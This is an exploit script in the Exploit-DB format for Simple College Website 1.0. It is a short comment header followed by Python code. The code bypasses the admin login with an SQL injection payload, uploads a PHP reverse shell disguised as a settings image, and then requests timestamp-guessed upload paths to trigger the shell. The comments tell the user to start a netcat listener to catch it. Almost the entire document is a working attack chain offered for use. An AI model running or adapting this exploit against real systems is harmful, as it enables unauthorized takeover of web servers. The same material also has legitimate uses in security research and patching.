# Exploit Title: Simple College Website 1.0 - SQL Injection / Remote Code Execution
# Date: 30-10-2020
# Exploit Author: yunaranyancat
# Vendor Homepage: https://www.sourcecodester.com/php/14548/simple-college-website-using-htmlphpmysqli-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/simple-college-website.zip
# Version: 1.0
# Tested on: Ubuntu 18.04 + XAMPP 7.4.11
# CVE ID : N/A

# replace revshell.php with your own php reverse shell
# change [TARGET URL] to target URL or IP address
# setup your netcat listener for sum good ol shellz

#!/usr/bin/python3

import requests
import time

def sqli_admin():
	s = requests.Session()
	data = {"username":"admin' or 1=1#","password":"hacked"}
	adminlogin = "http://[TARGET URL]/college_website/admin/ajax.php?action=login"
	s.post(adminlogin,data=data)
	return s

def trigger_rce(session):
	starttime = int(time.time())
	multipart_form_data = {
	"name": ("College of Hackers"),
	"email": ("test@test.com"),
	"contact" : ("+11111111111"),
	"about" : ("Nothing much about it"),
	"img" : ("revshell.php", open("revshell.php", "rb"))
	}
	session.post("http://[TARGET URL]/alumni/admin/ajax.php?action=save_settings", files=multipart_form_data)
	get_shell(starttime-100,starttime+100,session)


def get_shell(start,end,session):
	for i in range(start,end):
		session.get("http://[TARGET URL]/alumni/admin/assets/uploads/"+str(i)+"_revshell.php")

def main():
	session = sqli_admin()
	trigger_rce(session)

if __name__ == '__main__':
	main()